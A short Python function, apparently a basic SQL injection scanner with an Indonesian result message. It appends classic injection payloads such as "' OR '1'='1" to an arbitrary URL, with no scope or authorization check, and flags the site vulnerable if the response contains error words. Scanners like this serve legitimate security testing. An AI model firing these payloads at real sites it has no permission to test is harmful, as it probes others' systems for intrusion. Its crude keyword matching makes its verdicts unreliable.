import requests

def scan_sql(url):
    payloads = ["'", "' OR '1'='1", "';--", "\" OR \"1\"=\"1", "' OR 1=1--"]
    results = []

    for p in payloads:
        test_url = url + p
        try:
            r = requests.get(test_url, timeout=5)
            if any(err in r.text.lower() for err in ["sql syntax", "mysql", "syntax error", "warning"]):
                results.append({
                    "payload": p,
                    "result": "VULNERABLE",
                    "url_tested": test_url
                })
        except Exception as e:
            results.append({
                "payload": p,
                "result": "ERROR",
                "error": str(e),
                "url_tested": test_url
            })

    if results:
        return {
            "url": url,
            "vulnerable": any(r["result"] == "VULNERABLE" for r in results),
            "payloads_tested": results
        }
    else:
        return {
            "url": url,
            "vulnerable": False,
            "note": "Tidak ditemukan indikasi SQL Injection dari payload yang diuji."
        }
